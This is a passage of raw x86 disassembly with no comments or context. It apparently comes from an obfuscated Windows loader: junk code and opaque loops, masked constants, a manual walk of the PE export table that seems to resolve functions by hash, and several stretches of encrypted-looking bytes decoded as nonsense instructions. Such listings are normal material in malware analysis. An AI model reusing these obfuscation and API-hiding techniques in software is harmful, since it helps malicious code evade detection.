  40cc2f:	mov    eax,ds:0x4303bd
  40cc34:	inc    eax
  40cc35:	mov    ds:0x4303bd,eax
  40cc3a:	cmp    DWORD PTR ds:0x4303bd,0x29
  40cc41:	jne    0x40cc6b
  40cc47:	push   DWORD PTR [ebp-0x18]
  40cc4a:	push   DWORD PTR [ebp-0x10]
  40cc4d:	push   0x42e897
  40cc52:	push   0x5c7c
  40cc57:	push   0x209d
  40cc5c:	push   DWORD PTR [ebp-0x1c]
  40cc5f:	push   DWORD PTR [ebp-0x18]
  40cc62:	push   DWORD PTR [ebp-0x24]
  40cc65:	call   DWORD PTR ds:0x42ea4b
  40cc6b:	cmp    DWORD PTR ds:0x4303bd,0x1e
  40cc72:	jb     0x40cc2f
  40cc78:	mov    eax,DWORD PTR [ebp+0x8]
  40cc7b:	mov    al,BYTE PTR [eax]
  40cc7d:	add    al,0x38
  40cc7f:	xor    al,0x46
  40cc81:	cmp    al,0xc3
  40cc83:	jne    0x40ccc8
  40cc89:	mov    eax,DWORD PTR [ebp+0x8]
  40cc8c:	mov    ecx,DWORD PTR [ebp+0x8]
  40cc8f:	add    ecx,DWORD PTR [eax+0x3c]
  40cc92:	mov    edx,0x7510854
  40cc97:	mov    DWORD PTR [ebp+0x8],ecx
  40cc9a:	mov    eax,DWORD PTR [ebp-0x4]
  40cc9d:	xor    eax,edx
  40cc9f:	push   esi
  40cca0:	mov    esi,DWORD PTR [ebp+0x8]
  40cca3:	mov    ecx,0x32729b
  40cca8:	add    eax,ecx
  40ccaa:	cmp    DWORD PTR [esi+0x54],eax
  40ccad:	pop    esi
  40ccae:	je     0x40ccbc
  40ccb4:	mov    eax,DWORD PTR [ebp+0x8]
  40ccb7:	jmp    0x40ccd5
  40ccbc:	mov    eax,DWORD PTR [ebp-0x4]
  40ccbf:	xor    eax,edx
  40ccc1:	add    eax,ecx
  40ccc3:	jmp    0x40ccd5
  40ccc8:	mov    eax,DWORD PTR [ebp-0x4]
  40cccb:	xor    eax,0x7510854
  40ccd0:	add    eax,0x32729b
  40ccd5:	leave  
  40ccd6:	ret    0x4
  40ccd9:	push   ebp
  40ccda:	mov    ebp,esp
  40ccdc:	mov    eax,ds:0x41222c
  40cce1:	mov    edx,0x32729b
  40cce6:	sub    eax,edx
  40cce8:	mov    ecx,0x7510854
  40cced:	push   esi
  40ccee:	inc    esi
  40ccef:	mov    esi,DWORD PTR [ebp+0xc]
  40ccf2:	or     DWORD PTR ds:0x42e74c,0x4ea0
  40ccfc:	xor    eax,ecx
  40ccfe:	cmp    eax,esi
  40cd00:	mov    DWORD PTR ds:0x430457,0x1f44
  40cd0a:	je     0x40cda9
  40cd10:	mov    esi,DWORD PTR ds:0x42edd9
  40cd16:	mov    eax,ds:0x4303fd
  40cd1b:	sub    esi,eax
  40cd1d:	imul   esi,DWORD PTR [esi+eax*1]
  40cd21:	mov    eax,ds:0x412224
  40cd26:	and    esi,DWORD PTR ds:0x42ed57
  40cd2c:	mov    esi,DWORD PTR [ebp+0xc]
  40cd2f:	sub    eax,edx
  40cd31:	sbb    DWORD PTR ds:0x4303ed,0x6758
  40cd3b:	xor    eax,ecx
  40cd3d:	mov    DWORD PTR ds:0x430467,0x7cb5
  40cd47:	cmp    eax,esi
  40cd49:	mov    DWORD PTR ds:0x42e740,0x28eb
  40cd53:	jne    0x40cd7d
  40cd59:	mov    eax,ds:0x41222c
  40cd5e:	xor    DWORD PTR ds:0x4303f1,0x42ed4f
  40cd68:	add    eax,DWORD PTR ds:0x412224
  40cd6e:	mov    DWORD PTR ds:0x4303b9,0x6115
  40cd78:	jmp    0x40cd93
  40cd7d:	sbb    eax,0x6db0
  40cd82:	mov    eax,DWORD PTR [ebp+0xc]
  40cd85:	adc    DWORD PTR ds:0x4303bd,0x4303c9
  40cd8f:	xor    eax,ecx
  40cd91:	add    eax,edx
  40cd93:	mov    ds:0x412224,eax
  40cd98:	mov    eax,DWORD PTR [ebp+0xc]
  40cd9b:	xor    eax,ecx
  40cd9d:	add    eax,edx
  40cd9f:	mov    ds:0x41222c,eax
  40cda4:	jmp    0x40cdb3
  40cda9:	mov    eax,ds:0x41222c
  40cdae:	mov    ds:0x412224,eax
  40cdb3:	mov    eax,DWORD PTR [ebp+0x8]
  40cdb6:	mov    eax,DWORD PTR [eax]
  40cdb8:	mov    ecx,DWORD PTR ds:0x412224
  40cdbe:	add    DWORD PTR [eax],ecx
  40cdc0:	pop    esi
  40cdc1:	pop    ebp
  40cdc2:	ret    0x8
  40cdc5:	push   ebp
  40cdc6:	mov    ebp,esp
  40cdc8:	sub    esp,0x30
  40cdcb:	sbb    eax,DWORD PTR ds:0x42ed4b
  40cdd1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40cdd8:	and    DWORD PTR ds:0x4303c9,0x0
  40cde2:	mov    eax,ds:0x4303c9
  40cde7:	inc    eax
  40cde8:	mov    ds:0x4303c9,eax
  40cded:	cmp    DWORD PTR ds:0x4303c9,0x18
  40cdf4:	jne    0x40ce06
  40cdfa:	push   DWORD PTR [ebp-0x10]
  40cdfd:	push   DWORD PTR [ebp-0x1c]
  40ce00:	call   DWORD PTR ds:0x42ea4f
  40ce06:	cmp    DWORD PTR ds:0x4303c9,0x13
  40ce0d:	jb     0x40cde2
  40ce13:	adc    DWORD PTR ds:0x42ed57,0x4965
  40ce1d:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40ce24:	mov    ecx,DWORD PTR [ebp-0x4]
  40ce27:	sub    DWORD PTR ds:0x43044f,0x97c
  40ce31:	push   ebx
  40ce32:	adc    ebx,eax
  40ce34:	mov    eax,0x7510854
  40ce39:	xor    ecx,eax
  40ce3b:	add    ebx,0x6e38
  40ce41:	mov    ebx,0x32729b
  40ce46:	add    ecx,ebx
  40ce48:	mov    DWORD PTR [ebp-0x1c],ecx
  40ce4b:	and    ecx,0x1130
  40ce51:	mov    ecx,DWORD PTR [ebp+0x14]
  40ce54:	sub    DWORD PTR ds:0x42ed63,0x43045f
  40ce5e:	push   esi
  40ce5f:	push   edi
  40ce60:	test   ecx,ecx
  40ce62:	mov    DWORD PTR ds:0x42e74c,0x9d3
  40ce6c:	je     0x40cf83
  40ce72:	mov    DWORD PTR ds:0x4303bd,0x17
  40ce7c:	cmp    DWORD PTR ds:0x4303bd,0x0
  40ce83:	je     0x40cf64
  40ce89:	cmp    DWORD PTR ds:0x4303bd,0x5
  40ce90:	jne    0x40ced0
  40ce96:	push   0x56ae
  40ce9b:	push   DWORD PTR [ebp-0x28]
  40ce9e:	push   0x17dc
  40cea3:	push   0x51d4
  40cea8:	push   DWORD PTR [ebp-0x28]
  40ceab:	push   0x8ee9
  40ceb0:	push   DWORD PTR [ebp-0x1c]
  40ceb3:	push   0x10f5
  40ceb8:	push   DWORD PTR [ebp-0x18]
  40cebb:	push   0x42e75c
  40cec0:	push   0x42e863
  40cec5:	push   0x4a36
  40ceca:	call   DWORD PTR ds:0x42ebc3
  40ced0:	cmp    DWORD PTR ds:0x4303bd,0x6
  40ced7:	jne    0x40ceea
  40cedd:	mov    edi,DWORD PTR ds:0x4303bd
  40cee3:	dec    edi
  40cee4:	mov    DWORD PTR ds:0x4303bd,edi
  40ceea:	mov    edi,DWORD PTR ds:0x4303bd
  40cef0:	dec    edi
  40cef1:	mov    DWORD PTR ds:0x4303bd,edi
  40cef7:	jmp    0x40ce7c
  40cefc:	mov    DWORD PTR ds:0x42e754,0x14
  40cf06:	cmp    DWORD PTR ds:0x42e754,0x0
  40cf0d:	je     0x40cf64
  40cf13:	cmp    DWORD PTR ds:0x42e754,0x5
  40cf1a:	jne    0x40cf36
  40cf20:	push   DWORD PTR [ebp-0x28]
  40cf23:	push   0x4303cd
  40cf28:	push   DWORD PTR [ebp-0x24]
  40cf2b:	push   0x3dba
  40cf30:	call   DWORD PTR ds:0x42ebc7
  40cf36:	cmp    DWORD PTR ds:0x42e754,0x6
  40cf3d:	jne    0x40cf50
  40cf43:	mov    esi,DWORD PTR ds:0x42e754
  40cf49:	dec    esi
  40cf4a:	mov    DWORD PTR ds:0x42e754,esi
  40cf50:	mov    esi,DWORD PTR ds:0x42e754
  40cf56:	dec    esi
  40cf57:	mov    DWORD PTR ds:0x42e754,esi
  40cf5d:	jmp    0x40cf06
  40cf62:	add    edi,ecx
  40cf64:	mov    ecx,DWORD PTR [ebp+0x14]
  40cf67:	xor    DWORD PTR ds:0x42ed6f,0x2c6d
  40cf71:	mov    ecx,DWORD PTR [ecx]
  40cf73:	movzx  edi,BYTE PTR ds:0x42e744
  40cf7a:	sbb    DWORD PTR ds:0x4303b5,edi
  40cf80:	mov    DWORD PTR [ebp-0x1c],ecx
  40cf83:	imul   edx,eax
  40cf86:	mov    ecx,0x4573
  40cf8b:	mov    DWORD PTR ds:0x43045b,0x1f
  40cf95:	cmp    DWORD PTR ds:0x43045b,0x0
  40cf9c:	je     0x40cfed
  40cfa2:	cmp    DWORD PTR ds:0x43045b,0x9
  40cfa9:	jne    0x40cfbd
  40cfaf:	push   0x42ed5b
  40cfb4:	push   DWORD PTR [ebp-0x1c]
  40cfb7:	call   DWORD PTR ds:0x42e98f
  40cfbd:	cmp    DWORD PTR ds:0x43045b,0xa
  40cfc4:	jne    0x40cfd7
  40cfca:	mov    esi,DWORD PTR ds:0x43045b
  40cfd0:	dec    esi
  40cfd1:	mov    DWORD PTR ds:0x43045b,esi
  40cfd7:	xor    esi,esi
  40cfd9:	or     esi,DWORD PTR ds:0x43045b
  40cfdf:	dec    esi
  40cfe0:	mov    DWORD PTR ds:0x43045b,esi
  40cfe6:	jmp    0x40cf95
  40cfeb:	add    esi,edi
  40cfed:	add    edx,ecx
  40cfef:	mov    DWORD PTR ds:0x42ed73,0x11
  40cff9:	cmp    DWORD PTR ds:0x42ed73,0x0
  40d000:	je     0x40d094
  40d006:	cmp    DWORD PTR ds:0x42ed73,0x3
  40d00d:	jne    0x40d024
  40d013:	push   DWORD PTR [ebp-0x18]
  40d016:	push   0x42e758
  40d01b:	push   DWORD PTR [ebp-0x18]
  40d01e:	call   DWORD PTR ds:0x42ebcb
  40d024:	cmp    DWORD PTR ds:0x42ed73,0x4
  40d02b:	jne    0x40d03e
  40d031:	mov    esi,DWORD PTR ds:0x42ed73
  40d037:	dec    esi
  40d038:	mov    DWORD PTR ds:0x42ed73,esi
  40d03e:	mov    esi,DWORD PTR ds:0x42ed73
  40d044:	dec    esi
  40d045:	mov    DWORD PTR ds:0x42ed73,esi
  40d04b:	jmp    0x40cff9
  40d050:	and    DWORD PTR ds:0x4303b9,0x0
  40d05a:	mov    esi,DWORD PTR ds:0x4303b9
  40d060:	inc    esi
  40d061:	mov    DWORD PTR ds:0x4303b9,esi
  40d067:	cmp    DWORD PTR ds:0x4303b9,0x23
  40d06e:	jne    0x40d087
  40d074:	push   0x4365
  40d079:	push   0x641d
  40d07e:	push   DWORD PTR [ebp-0xc]
  40d081:	call   DWORD PTR ds:0x42e993
  40d087:	cmp    DWORD PTR ds:0x4303b9,0x19
  40d08e:	jb     0x40d05a
  40d094:	mov    esi,0x7879
  40d099:	mov    edi,DWORD PTR ds:0x42ed5b
  40d09f:	sub    DWORD PTR ds:0x42e73c,edi
  40d0a5:	mov    edi,0x1556
  40d0aa:	xchg   esi,ecx
  40d0ac:	mov    ecx,DWORD PTR ds:0x42ed5f
  40d0b2:	xor    DWORD PTR ds:0x42ed67,ecx
  40d0b8:	sub    edx,edi
  40d0ba:	xor    esi,esi
  40d0bc:	movzx  ecx,WORD PTR ds:0x42e754
  40d0c3:	or     DWORD PTR ds:0x4303c1,ecx
  40d0c9:	mov    DWORD PTR [ebp-0x28],esi
  40d0cc:	or     ecx,DWORD PTR ds:0x42ed73
  40d0d2:	mov    DWORD PTR [ebp-0x2c],esi
  40d0d5:	sbb    DWORD PTR ds:0x4303cd,ebx
  40d0db:	mov    DWORD PTR [ebp-0x14],esi
  40d0de:	or     DWORD PTR ds:0x42ed5b,ebx
  40d0e4:	mov    DWORD PTR [ebp-0x8],esi
  40d0e7:	mov    ecx,DWORD PTR ds:0x43046b
  40d0ed:	xor    DWORD PTR ds:0x42ed5f,ecx
  40d0f3:	mov    ecx,DWORD PTR [ebp-0x18]
  40d0f6:	xor    ecx,eax
  40d0f8:	xor    DWORD PTR ds:0x42ed57,0x70e3
  40d102:	xor    edi,edi
  40d104:	movzx  eax,BYTE PTR ds:0x42ed4f
  40d10b:	or     DWORD PTR ds:0x42ed5b,eax
  40d111:	jmp    0x40d25a
  40d116:	adc    al,0xe1
  40d118:	addr16 jp 0x40d18e
  40d11b:	clc    
  40d11c:	jno    0x40d10f
  40d11e:	inc    ebx
  40d11f:	xor    bl,al
  40d121:	xor    DWORD PTR [eax+0x59],edx
  40d124:	(bad)  
  40d125:	mov    edx,0x7e7e81f9
  40d12a:	and    bh,BYTE PTR [edi+0x7e]
  40d12d:	jle    0x40d12b
  40d12f:	iret   
  40d130:	out    dx,al
  40d131:	xor    DWORD PTR [ebx],0xcf632778
  40d137:	push   esi
  40d138:	int3   
  40d139:	xor    eax,0x5daa7515
  40d13e:	and    al,BYTE PTR [esi-0x44]
  40d141:	mov    cl,0xe9
  40d143:	xor    eax,0x5bcf5543
  40d148:	cmp    al,0xee
  40d14a:	cmp    al,0x5e
  40d14c:	pop    eax
  40d14d:	sti    
  40d14e:	mov    al,ds:0xe0ae32c
  40d153:	cmp    al,0x35
  40d155:	dec    edx
  40d156:	push   ecx
  40d157:	add    al,0x43
  40d159:	imul   esi,DWORD PTR [ebp-0x1bd07d35],0xce8dcd15
  40d163:	loop   0x40d11c
  40d165:	ja     0x40d18e
  40d167:	fldcw  WORD PTR [edx+0x73f03a08]
  40d16d:	and    eax,0x8daf839d
  40d172:	daa    
  40d173:	mov    DWORD PTR ds:0xb176fd8e,esp
  40d179:	xlat   BYTE PTR ds:[ebx]
  40d17a:	add    DWORD PTR [edi],esi
  40d17c:	mov    ebp,0xb5fea2b8
  40d181:	mov    cl,0x26
  40d183:	mov    ebx,0xffcdfa2a
  40d188:	dec    esi
  40d189:	scas   eax,DWORD PTR es:[edi]
  40d18a:	jmp    0x40d1b8
  40d18c:	cli    
  40d18d:	sub    DWORD PTR [edx-0x19],0x63ff08db
  40d194:	mov    ch,0xb3
  40d196:	xor    al,0x19
  40d198:	pop    eax
  40d199:	mov    dh,0x40
  40d19b:	cmp    edx,ebx
  40d19d:	mov    bl,0xec
  40d19f:	add    dl,BYTE PTR [ebx+0x2c1b4409]
  40d1a5:	sub    eax,0x8f8ae357
  40d1aa:	xchg   DWORD PTR [ebx-0xa],ebp
  40d1ad:	jl     0x40d13a
  40d1af:	scas   al,BYTE PTR es:[edi]
  40d1b0:	xchg   ecx,eax
  40d1b1:	add    bl,dl
  40d1b3:	(bad)  
  40d1b4:	jg     0x40d1dc
  40d1b6:	mov    edi,0x90d52fea
  40d1bb:	(bad)  
  40d1bc:	fisttp DWORD PTR [esp+ebp*4-0x7d]
  40d1c0:	scas   eax,DWORD PTR es:[edi]
  40d1c1:	xor    esi,0x15
  40d1c4:	pop    ecx
  40d1c5:	xlat   BYTE PTR ds:[ebx]
  40d1c6:	shl    DWORD PTR [edi+eax*8-0x48],cl
  40d1ca:	cmp    al,BYTE PTR [edx+0x5675431e]
  40d1d0:	jecxz  0x40d230
  40d1d2:	inc    ebp
  40d1d3:	mov    al,ds:0x1345aaed
  40d1d8:	jecxz  0x40d183
  40d1da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1db:	cld    
  40d1dc:	sbb    eax,0xf32d38dc
  40d1e1:	cmp    BYTE PTR [eax],bh
  40d1e3:	test   bl,cl
  40d1e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1e6:	and    cl,BYTE PTR [ebx+0x43]
  40d1e9:	add    DWORD PTR [edx],0x1a
  40d1ec:	nop
  40d1ed:	in     al,dx
  40d1ee:	scas   al,BYTE PTR es:[edi]
  40d1ef:	and    BYTE PTR [ecx+0x1f],cl
  40d1f2:	clc    
  40d1f3:	mov    DWORD PTR [edx],esp
  40d1f5:	bound  edx,QWORD PTR [ecx+0x531cda61]
  40d1fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1fc:	sbb    al,0xc
  40d1fe:	and    edx,DWORD PTR [ebx+0x69487083]
  40d204:	sbb    edx,DWORD PTR [ecx+0x5b6a506f]
  40d20a:	dec    esi
  40d20b:	sbb    al,0x7b
  40d20d:	mov    es,eax
  40d20f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d210:	pushf  
  40d211:	fwait
  40d212:	pop    edx
  40d213:	mov    ecx,0xcfe0421d
  40d218:	test   BYTE PTR [edx-0x44],ah
  40d21b:	addr16 loop 0x40d258
  40d21e:	jge    0x40d29f
  40d220:	mov    BYTE PTR ds:0x65828dd5,cl
  40d226:	mov    bl,0x8b
  40d228:	jle    0x40d245
  40d22a:	pop    esi
  40d22b:	xor    eax,0xb47bebf
  40d230:	pop    esp
  40d231:	jno    0x40d293
  40d233:	xchg   BYTE PTR [eax],al
  40d235:	fs dec eax
  40d237:	xchg   esi,eax
  40d238:	std    
  40d239:	add    al,BYTE PTR [ecx-0x3e715cf6]
  40d23f:	addr16 ja 0x40d278
  40d242:	push   ebp
  40d243:	adc    BYTE PTR [eax-0x63],bl
  40d246:	inc    ebp
  40d247:	in     eax,0x51
  40d249:	call   0x7c61:0x8b5b661d
  40d250:	mov    WORD PTR ds:0x408bd24,?
  40d256:	jecxz  0x40d238
  40d258:	mov    esi,DWORD PTR [ebx+0x3]
  40d25b:	retf   
  40d25c:	mov    DWORD PTR [ebp-0x20],ecx
  40d25f:	mov    eax,ds:0x430467
  40d264:	mov    eax,DWORD PTR [ebp-0x20]
  40d267:	je     0x40d591
  40d26d:	mov    eax,DWORD PTR [ebp-0x4]
  40d270:	and    DWORD PTR ds:0x42ed67,0x42e744
  40d27a:	xor    eax,0x7510854
  40d27f:	or     DWORD PTR ds:0x42ed6f,0x3ff6
  40d289:	add    eax,ebx
  40d28b:	mov    DWORD PTR ds:0x42ed5f,0x774f
  40d295:	cmp    edi,eax
  40d297:	mov    DWORD PTR ds:0x42ed57,0x9b6
  40d2a1:	jne    0x40d3eb
  40d2a7:	push   DWORD PTR [ebp+0x8]
  40d2aa:	sub    DWORD PTR ds:0x4303b9,0x4303c5
  40d2b4:	call   0x40cbbb
  40d2b9:	mov    ecx,DWORD PTR ds:0x43045f
  40d2bf:	add    DWORD PTR ds:0x42ed57,ecx
  40d2c5:	mov    DWORD PTR [ebp-0x20],eax
  40d2c8:	add    ecx,ecx
  40d2ca:	mov    eax,DWORD PTR [ebp-0x4]
  40d2cd:	mov    ecx,DWORD PTR [ebp-0x20]
  40d2d0:	mov    esi,DWORD PTR ds:0x42e8ef
  40d2d6:	mov    esi,DWORD PTR [esi]
  40d2d8:	and    DWORD PTR ds:0x4303e5,esi
  40d2de:	mov    esi,0x7510854
  40d2e3:	sub    DWORD PTR ds:0x4303dd,0x42ed53
  40d2ed:	xor    eax,esi
  40d2ef:	add    eax,ebx
  40d2f1:	mov    DWORD PTR ds:0x42e744,0x6de1
  40d2fb:	cmp    ecx,eax
  40d2fd:	mov    DWORD PTR ds:0x4303c9,0x4fd
  40d307:	je     0x40d575
  40d30d:	sbb    DWORD PTR ds:0x4303e5,0x4303bd
  40d317:	push   DWORD PTR [ebp-0x20]
  40d31a:	push   DWORD PTR [ebp+0x8]
  40d31d:	mov    DWORD PTR ds:0x42e744,0x2d65
  40d327:	call   0x4041b8
  40d32c:	xor    DWORD PTR ds:0x42ed6b,0x6710
  40d336:	mov    DWORD PTR [ebp-0x14],eax
  40d339:	or     DWORD PTR ds:0x4303c9,0x430453
  40d343:	mov    eax,DWORD PTR [ebp-0x4]
  40d346:	adc    DWORD PTR ds:0x4303b5,0x2fc0
  40d350:	mov    ecx,DWORD PTR [ebp-0x14]
  40d353:	add    DWORD PTR ds:0x4303cd,0x5a83
  40d35d:	xor    eax,esi
  40d35f:	add    eax,ebx
  40d361:	mov    DWORD PTR ds:0x4303e1,0x3b14
  40d36b:	cmp    ecx,eax
  40d36d:	je     0x40d575
  40d373:	mov    eax,DWORD PTR [ebp-0x14]
  40d376:	and    DWORD PTR ds:0x4303dd,0x0
  40d380:	mov    ecx,DWORD PTR ds:0x4303dd
  40d386:	inc    ecx
  40d387:	mov    DWORD PTR ds:0x4303dd,ecx
  40d38d:	cmp    DWORD PTR ds:0x4303dd,0x1d
  40d394:	jne    0x40d3b2
  40d39a:	push   0x4303c1
  40d39f:	push   0x883a
  40d3a4:	push   0x157c
  40d3a9:	push   DWORD PTR [ebp-0x28]
  40d3ac:	call   DWORD PTR ds:0x42ea53
  40d3b2:	cmp    DWORD PTR ds:0x4303dd,0x18
  40d3b9:	jb     0x40d380
  40d3bf:	mov    eax,DWORD PTR [eax+0x18]
  40d3c2:	mov    DWORD PTR [ebp-0x20],eax
  40d3c5:	mov    eax,DWORD PTR [ebp-0x14]
  40d3c8:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3cb:	add    ecx,DWORD PTR [eax+0x20]
  40d3ce:	mov    DWORD PTR [ebp-0x28],ecx
  40d3d1:	mov    eax,DWORD PTR [ebp-0x14]
  40d3d4:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3d7:	add    ecx,DWORD PTR [eax+0x24]
  40d3da:	mov    DWORD PTR [ebp-0x2c],ecx
  40d3dd:	mov    eax,DWORD PTR [ebp-0x14]
  40d3e0:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3e3:	add    ecx,DWORD PTR [eax+0x1c]
  40d3e6:	xor    esi,esi
  40d3e8:	mov    DWORD PTR [ebp-0x14],ecx
  40d3eb:	mov    eax,DWORD PTR [ebp-0x28]
  40d3ee:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3f1:	add    ecx,DWORD PTR [eax+edi*4]
  40d3f4:	lea    eax,[ebp-0x8]
  40d3f7:	mov    DWORD PTR [ebp-0x30],ecx
  40d3fa:	push   eax
  40d3fb:	push   DWORD PTR [ebp-0x30]
  40d3fe:	jmp    0x40d547
  40d403:	add    al,BYTE PTR [ebx]
  40d405:	in     eax,dx
  40d406:	jecxz  0x40d3f5
  40d408:	icebp  
  40d409:	adc    bl,ah
  40d40b:	push   0xa06a8e30
  40d410:	xchg   ebp,eax
  40d411:	xor    al,0x35
  40d413:	lods   eax,DWORD PTR ds:[esi]
  40d414:	mov    ?,WORD PTR [esi+0x7e]
  40d417:	and    bh,BYTE PTR [edi+0x7e]
  40d41a:	jle    0x40d474
  40d41c:	adc    BYTE PTR [ebp-0x414135ad],ah
  40d422:	or     eax,eax
  40d424:	xchg   esp,eax
  40d425:	call   0xb6647bbb
  40d42a:	or     DWORD PTR [edi+0x4c001c2b],0xffffffc1
  40d431:	pop    esi
  40d432:	ds test eax,0x429472bb
  40d438:	ret    0x6262
  40d43b:	cs fstp st(2)
  40d43e:	mov    ecx,0xe526a7a1
  40d443:	push   edx
  40d444:	(bad)  
  40d446:	arpl   WORD PTR [ecx-0x56],bx
  40d449:	push   0xc140d04d
  40d44e:	mov    ecx,DWORD PTR [ecx-0x41]
  40d451:	mov    gs,WORD PTR [ebp-0x2f]
  40d454:	pop    ebp
  40d455:	hlt    
  40d456:	rcr    BYTE PTR [eax],0x72
  40d459:	fsub   st,st(5)
  40d45b:	int3   
  40d45c:	sub    eax,0x212a58c2
  40d461:	sub    BYTE PTR [edi+0x77],dl
  40d464:	sti    
  40d465:	cmp    DWORD PTR [ecx],edi
  40d467:	and    dl,BYTE PTR [edx]
  40d469:	adc    eax,DWORD PTR [ebx-0x54]
  40d46c:	leave  
  40d46d:	mov    eax,0x5c0f520b
  40d472:	loopne 0x40d479
  40d474:	mov    dl,0x7e
  40d476:	mov    esp,0x493efec0
  40d47b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d47c:	icebp  
  40d47d:	test   eax,0x1735aad5
  40d482:	xchg   ebx,eax
  40d483:	xchg   esi,eax
  40d484:	xor    esi,DWORD PTR [eax-0x43389620]
  40d48a:	mov    ch,0x9e
  40d48c:	mov    eax,0xc2746eff
  40d491:	retf   
  40d492:	test   al,0x24
  40d494:	pop    esp
  40d495:	scas   eax,DWORD PTR es:[edi]
  40d496:	dec    ebp
  40d497:	test   eax,0x8c864e4c
  40d49c:	aad    0x1c
  40d49e:	push   esp
  40d49f:	pop    ds
  40d4a0:	mov    WORD PTR [esi],?
  40d4a2:	pop    esi
  40d4a3:	cwde   
  40d4a4:	cdq    
  40d4a5:	dec    BYTE PTR ds:[esi+0x534791b1]
  40d4ac:	fisub  DWORD PTR [ecx-0x20]
  40d4af:	out    dx,al
  40d4b0:	nop
  40d4b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4b2:	js     0x40d461
  40d4b4:	call   0x84e8:0xf00a9a9a
  40d4bb:	xchg   BYTE PTR ds:0xb93bc6bb,ch
  40d4c1:	mov    ebp,0x4190b73d
  40d4c6:	cmp    BYTE PTR [ecx+edi*2+0x71519e40],al
  40d4cd:	xchg   ecx,eax
  40d4ce:	dec    DWORD PTR [edi-0x45]
  40d4d1:	add    ah,dl
  40d4d3:	scas   al,BYTE PTR es:[edi]
  40d4d4:	out    0x5b,al
  40d4d6:	push   cs
  40d4d7:	(bad)  
  40d4d8:	fwait
  40d4d9:	jmp    0x40d4a1
  40d4db:	mov    cs,WORD PTR [ebp+0x1b923575]
  40d4e1:	dec    esi
  40d4e2:	dec    ecx
  40d4e3:	sub    BYTE PTR [ebx-0x5d6279aa],cl
  40d4e9:	fs ret 0xad9
  40d4ed:	sbb    al,al
  40d4ef:	adc    edx,ecx
  40d4f1:	adc    eax,0x5eb2f91e
  40d4f6:	xlat   BYTE PTR ds:[ebx]
  40d4f7:	push   0xf72ff1c2
  40d4fc:	sar    BYTE PTR [esi+0x106e0542],0x98
  40d503:	pop    ss
  40d504:	es ret 
  40d506:	xor    DWORD PTR [edx+eiz*4+0x62a8bd07],ebx
  40d50d:	retf   
  40d50e:	xor    bh,dl
  40d510:	aas    
  40d511:	sbb    ah,BYTE PTR [esi]
  40d513:	add    BYTE PTR [ecx+0x23],bl
  40d516:	lock add edi,esi
  40d519:	push   DWORD PTR [ebx-0x5b]
  40d51c:	mov    esp,0x9358ef50
  40d521:	push   ss
  40d522:	arpl   WORD PTR [ecx+0x28],ax
  40d525:	cmp    edx,edi
  40d527:	add    bh,BYTE PTR [esi]
  40d529:	rol    BYTE PTR [eax-0x61e9bb57],1
  40d52f:	in     eax,0xe5
  40d531:	mov    edi,0xbc44df79
  40d536:	fnsave [edi]
  40d538:	dec    ebp
  40d539:	ss sti 
  40d53b:	jmp    0xaf80940e
  40d540:	jb     0x40d500
  40d542:	std    
  40d543:	mov    edx,0xff673f34
  40d548:	jne    0x40d556
  40d54a:	call   0x402e68
  40d54f:	mov    eax,DWORD PTR [ebp-0x4]
  40d552:	mov    ecx,DWORD PTR [ebp-0x8]
  40d555:	xor    eax,0x7510854
  40d55a:	add    eax,ebx
  40d55c:	cmp    ecx,eax
  40d55e:	jne    0x40d581
  40d564:	mov    eax,DWORD PTR [ebp-0x20]
  40d567:	inc    edi
  40d568:	cmp    edi,eax
  40d56a:	jb     0x40d26d
  40d570:	jmp    0x40d591
  40d575:	mov    eax,DWORD PTR [ebp-0x4]
  40d578:	xor    eax,esi
  40d57a:	add    eax,ebx
  40d57c:	jmp    0x40dfde
  40d581:	mov    eax,DWORD PTR [ebp-0x2c]
  40d584:	movzx  eax,WORD PTR [eax+edi*2]
  40d588:	mov    ecx,DWORD PTR [ebp-0x14]
  40d58b:	mov    eax,DWORD PTR [ecx+eax*4]
  40d58e:	mov    DWORD PTR [ebp+0xc],eax
  40d591:	mov    eax,DWORD PTR [ebp-0x4]
  40d594:	mov    ecx,DWORD PTR [ebp-0x8]
  40d597:	xor    eax,0x7510854
  40d59c:	add    eax,ebx
  40d59e:	cmp    ecx,eax
  40d5a0:	jne    0x40d6fc
  40d5a6:	jmp    0x40d6ef
  40d5ab:	aad    0x5b
  40d5ad:	fstp   DWORD PTR [ecx+0x73559971]
  40d5b3:	push   0x64
  40d5b5:	fsin   
  40d5b7:	mov    ah,0xf4
  40d5b9:	mov    dh,0xef
  40d5bb:	push   ecx
  40d5bc:	(bad)  
  40d5bd:	jle    0x40d63d
  40d5bf:	and    bh,BYTE PTR [edi+0x7e]
  40d5c2:	jle    0x40d56d
  40d5c4:	loopne 0x40d640
  40d5c6:	push   esi
  40d5c7:	(bad)  
  40d5c8:	pusha  
  40d5c9:	adc    DWORD PTR [eax-0x5f],esp
  40d5cc:	rcl    dl,0x4d
  40d5cf:	repnz add BYTE PTR [esi+esi*2-0x22],bh
  40d5d4:	push   edi
  40d5d5:	lds    eax,FWORD PTR [edi+0x54]
  40d5d8:	sub    DWORD PTR [ebp+0x44ba440a],edx
  40d5de:	inc    esp
  40d5df:	and    dl,BYTE PTR [ebx-0x11]
  40d5e2:	pop    ds
  40d5e3:	xor    eax,0xf7696fdd
  40d5e8:	add    al,0xb2
  40d5ea:	mov    al,0x3d
  40d5ec:	outs   dx,DWORD PTR ds:[esi]
  40d5ed:	mov    cl,0x8
  40d5ef:	out    dx,eax
  40d5f0:	xor    DWORD PTR [edx+edi*4-0x47],ebp
  40d5f4:	call   0x8562:0xbb7610de
  40d5fb:	jns    0x40d5ab
  40d5fd:	call   0xb838:0xab88e360
  40d604:	je     0x40d5ff
  40d606:	ss adc ch,dh
  40d609:	call   0xea43d56
  40d60e:	iret   
  40d60f:	xchg   esp,eax
  40d610:	sbb    al,BYTE PTR [esi-0x25783de5]
  40d616:	push   es
  40d617:	test   DWORD PTR ds:0x7f1ef213,edi
